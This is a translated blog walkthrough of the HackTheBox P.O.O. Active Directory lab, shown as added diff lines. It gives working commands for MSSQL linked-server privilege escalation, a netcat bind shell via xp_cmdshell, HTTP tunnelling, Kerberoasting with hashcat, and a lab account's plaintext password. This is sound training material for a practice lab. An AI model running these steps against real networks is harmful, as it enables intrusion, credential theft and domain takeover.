@@ -1,1 +1,274 @@
 https://hackyourmom.com/en/osvita/samonavchannya/ctf-ta-rajtapy/yak-projty-laboratoriyu-professional-offensive-operations-na-hackthebox/
+This article provides a detailed walkthrough of the HackTheBox P.O.O. mini-lab, designed to test your skills in all phases of an Active Directory attack. The reader will learn how to compromise an accessible host, escalate privileges, and take over an entire domain, collecting five flags. The article includes step-by-step instructions on how to use masscan, nmap, gobuster, as well as analyze .DS_Store files and exploit IIS ShortName vulnerabilities.
+
+
+
+Step-by-step guide
+In this article, we will analyze the passage of not just a machine, but an entire mini-lab from the HackTheBox site. POO is designed to test skills at all stages of attacks in a small Active Directory environment. The task is to compromise an accessible host, elevate privileges and finally capture the entire domain, while it is necessary to collect five flags.
+
+Connection to the lab is via VPN. It is recommended to avoid using a work computer or host on which important data is stored for connection, since specialists with a high level of competence in the field of information security may be located in a private network.
+
+Intro
+This endgame involves two cars and contains five flags.
+
+
+
+A description and address of the available host are also given.
+
+
+
+Recon flag
+This machine has an IP address of 10.13.38.11, which I add to /etc/hosts.
+
+10.13.38.11 poo.htb
+First, we scan for open ports. Since scanning all ports with nmap is a long time, I’ll do it first with masscan. We scan all TCP and UDP ports from the tun0 interface at a rate of 500 packets per second.
+
+sudo masscan -e tun0 -p1-65535,U:1-65535 10.13.38.11 --rate=500
+
+
+Now, to get more detailed information about the services running on the ports, let’s run the scan with the -A option.
+
+nmap -A poo.htb -p80,1433
+
+
+This environment presents IIS and MSSQL services, and the real DNS name of the domain and computer are available. The IIS home page is displayed on the web server.
+
+
+
+Let’s go through the directories. For this, we use the gobuster tool. The parameters specify the number of threads (128) via the -t option, the URL via -u, the dictionary via -w, and the file extensions of interest via -x.
+
+gobuster dir -t 128 -u poo.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,aspx,html
+
+
+So, we have HTTP authentication for the /admin directory, and the desktop service store file .DS_Store is available. .DS_Store are files that store settings for a folder, such as the list of files, the location of icons, the selected background image. Such a file can end up in the web server directory of web developers. Thus, we get information about the contents of the directory. For this, you can use the DS_Store Crawler.
+
+python3 dsstore_crawler.py -i http://poo.htb/
+
+
+We get the contents of the directory. The most interesting thing here is the /dev directory, from which we can see the source db files in two branches. But we can see the first 6 characters of the file and directory names if the service is vulnerable to IIS ShortName. You can check for this vulnerability using IIS shortname Scanner.
+
+
+
+There is a text file whose name begins with “poo_co”. In the absence of further clear instructions, it was decided to select all directories whose names begin with “co” from the dictionary.
+
+cat /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt | grep -i "^co" > co_words.txt
+Let’s go through it using wfuzz.
+
+wfuzz -w ./co_words.txt -u "http://poo.htb/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt" --hc 404
+
+
+We find the appropriate word! We look at this file, save the credentials (judging by the DBNAME parameter, they are from MSSQL).
+
+
+
+We surrender the flag and advance by 20%.
+
+
+
+Huh flag
+We connect to MSSQL, using DBeaver.
+
+
+
+We don’t find anything interesting in this database, so we create an SQL editor and check what users there are.
+
+
+
+We have two users. Let’s check our privileges.
+
+SELECT is_srvrolemember('sysadmin'), is_srvrolemember('dbcreator'), is_srvrolemember('bulkadmin'), is_srvrolemember('diskadmin'), is_srvrolemember('processadmin'), is_srvrolemember('serveradmin'), is_srvrolemember('setupadmin'), is_srvrolemember('securityadmin');
+
+
+So, no privileges. Let’s look at the associated servers.
+
+So we see another SQL Server. Let’s check the execution of commands on this server using openquery().
+
+
+
+And we can even build a query tree.
+
+SELECT version FROM openquery("COMPATIBILITY\POO_CONFIG", 'SELECT version FROM openquery("COMPATIBILITY\POO_PUBLIC", ''select @@version as version'');');
+When a request is made to a linked server, it is processed in the context of a different user. You need to check under which user the operations on the linked server are being performed.
+SELECT name FROM openquery("COMPATIBILITY\POO_CONFIG", 'SELECT user_name() as name');
+
+
+Now let’s see in what context the request from the linked server to ours is executed!
+
+SELECT * FROM openquery("COMPATIBILITY\POO_CONFIG", 'SELECT name FROM openquery("COMPATIBILITY\POO_PUBLIC", ''SELECT user_name() as name'');');
+
+
+This context corresponds to DBO, which usually has all the necessary privileges. The next step is to check the available privileges in case of executing a query from the linked server.
+
+SELECT * FROM openquery("COMPATIBILITY\POO_CONFIG", 'SELECT * FROM openquery("COMPATIBILITY\POO_PUBLIC", ''SELECT is_srvrolemember(''''sysadmin''''), is_srvrolemember(''''dbcreator''''), is_srvrolemember(''''bulkadmin''''), is_srvrolemember(''''diskadmin''''), is_srvrolemember(''''processadmin''''), is_srvrolemember(''''serveradmin''''), is_srvrolemember(''''setupadmin''''), is_srvrolemember(''''securityadmin'''')'')');
+
+
+As you can see, all privileges are available. The command is used to create the administrator, but Openquery blocks access. In this case, it is advisable to use the EXECUTE AT method to perform the necessary actions.
+
+EXECUTE('EXECUTE(''CREATE LOGIN [ralf] WITH PASSWORD=N''''ralfralf'''', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF'') AT "COMPATIBILITY\POO_PUBLIC"') AT "COMPATIBILITY\POO_CONFIG";
+EXECUTE('EXECUTE(''CREATE USER [ralf] FOR LOGIN [ralf]'') AT "COMPATIBILITY\POO_PUBLIC"') AT "COMPATIBILITY\POO_CONFIG";
+EXECUTE('EXECUTE(''ALTER SERVER ROLE [sysadmin] ADD MEMBER [ralf]'') AT "COMPATIBILITY\POO_PUBLIC"') AT "COMPATIBILITY\POO_CONFIG";
+EXECUTE('EXECUTE(''ALTER ROLE [db_owner] ADD MEMBER [ralf]'') AT "COMPATIBILITY\POO_PUBLIC"') AT "COMPATIBILITY\POO_CONFIG";
+We connect with the new user’s credentials and observe the new flag database.
+
+
+
+Let’s hand over this flag and move on.
+
+
+
+
+BackTrack flag
+To get a shell through MSSQL, you can use the mssqlclient tool from the impacket package. This method allows you to establish a connection and perform the necessary actions on the server.
+
+mssqlclient.py ralf:ralfralf@poo.htb -db POO_PUBLIC
+
+
+We need to get the passwords, and the first thing we’ve encountered is a website. So we need a web server config (we can’t throw a convenient shell, the firewall is probably running).
+
+
+
+But access is denied. Although we can read the file from MSSQL, we only need to know what programming languages ​​are configured. And in the MSSQL directory we find out that there is Python.
+
+
+
+Then there is no problem reading the web.config file.
+
+EXEC sp_execute_external_script
+@language = N'Python',
+@script = "print(open('C:\inetpub\wwwroot\web.config').read())"
+
+
+With the found credentials, go to /admin and remove the flag.
+
+
+
+
+
+Foothold flag
+Using a firewall creates some inconveniences, but when analyzing the network settings, it turns out that IPv6 is also used. This opens up additional possibilities for further actions.
+
+
+Let’s add this address to /etc/hosts.
+
+dead:babe::1001 poo6.htb
+We scan the host again, but this time using the IPv6 protocol.
+
+
+
+And the WinRM service is available on IPv6. Let’s connect with the credentials we found.
+
+
+
+There is a flag on the desktop, hand it over.
+
+
+
+P00ned flag
+After conducting reconnaissance on the host using winpeas, we did not find anything special. Then it was decided to search for credentials again. But we did not manage to get all SPNs from the system via WinRM.
+
+setspn.exe -T intranet.poo -Q */*
+
+
+Let’s execute the command via MSSQL.
+
+
+
+Using this method, you can obtain the SPNs of users p00_hr and p00_adm, which makes them vulnerable to a Kerberosting attack. This approach allows you to obtain hashes of their passwords.
+
+First, you need to provide a stable shell on behalf of the MSSQL user. However, due to limited access, communication with the host is possible only through ports 80 and 1433. In this case, it is possible to tunnel traffic through port 80. A special application is used to implement this. The tunnel.aspx file is downloaded to the home directory of the web server at C:\inetpub\wwwroot.
+
+
+
+But when we try to access it, we get a 404 error. This means that *.aspx files are not executable. To make files with this extension executable, we will install ASP.NET 4.5 as follows.
+
+dism /online /enable-feature /all /featurename:IIS-ASPNET45
+
+
+
+
+And now when we access tunnel.aspx we get a response that everything is ready to work.
+
+
+
+We launch the client part of the program, which performs traffic relay. All data is redirected from port 5432 to the server, providing the necessary connection for further actions.
+
+
+
+And we use proxychains to send traffic of any application through our proxy. We will add this proxy to the configuration file /etc/proxychains.conf.
+
+
+
+Now we will upload the netcat program to the server, with which we will create a stable bind shell, and the Invoke-Kerberoast script, with which we will perform a Kerberoasting attack.
+
+
+
+Now we run the listoner through MSSQL.
+
+xp_cmdshell C:\temp\nc64.exe -e powershell.exe -lvp 4321
+
+
+And we connect through our proxy.
+
+proxychains rlwrap nc poo.htb 4321
+
+
+Let’s get the hashes.
+
+. .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'C:\temp\kerb_hashes.txt' -Width 8000
+type kerb_hashes.txt
+
+
+Next, it is necessary to perform an enumeration of the obtained hashes. Due to the lack of corresponding passwords in Ukrainian dictionaries, it was decided to use all available password dictionaries from the Seclists set. The hashcat tool is used to enumerate hashes, which provides efficient and fast selection.
+
+hashcat -a 0 -m 13100 krb_hashes.txt /usr/share/seclists/Passwords/*.txt --force
+And we find both passwords, the first in the dictionary dutch_passwordlist.txt, and the second in Keyboard-Combinations.txt.
+
+
+
+
+
+And so we have three users, let’s go to the domain controller. First, let’s find out its address.
+
+
+
+We managed to get the IP address of the domain controller. The next step will be to get a list of all domain users and determine which of them are administrators. To do this, we use the PowerView.ps1 script.
+
+The script is loaded into the system through a connection using evil-winrm. The -s parameter specifies the directory where the script is located. After connecting, the PowerView script is loaded into the environment, which allows you to collect the necessary information about domain users and their roles.
+
+
+
+Now we have access to all its functions. The user p00_adm is similar to the privileged one, so we will work in its context. Let’s create a PSCredential object for this user.
+
+$User = 'p00_adm'
+$Password = 'ZQ!5t4r'
+$Cpass = ConvertTo-SecureString -AsPlainText $Password -force
+$Creds = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Cpass
+Now all Powershell commands where we specify Creds will be executed as p00_adm. Let’s list the users and the AdminCount attribute.
+
+Get-NetUser -DomainController dc -Credential $Creds | select name,admincount
+
+
+So, our user is really privileged. Let’s see what groups he is in.
+
+Get-NetGroup -UserName "p00_adm" -DomainController dc -Credential $Creds
+
+
+It is confirmed that the user has domain administrator rights, which allows remote login to the domain controller. An attempt is made to connect via WinRM using the configured tunnel. When working with evil-winrm, errors related to the operation of reGeorg occur.
+
+
+
+Then we will use another, lighter script to connect to WinRM. We will open and change the connection parameters.
+
+
+
+We try to connect, and we are in the system.
+
+
+
+But there is no flag. Then look at the user and check the desktops.
+
+
+
+A flag has been detected in mr3ks confirming the successful completion of the lab at 100%.
+
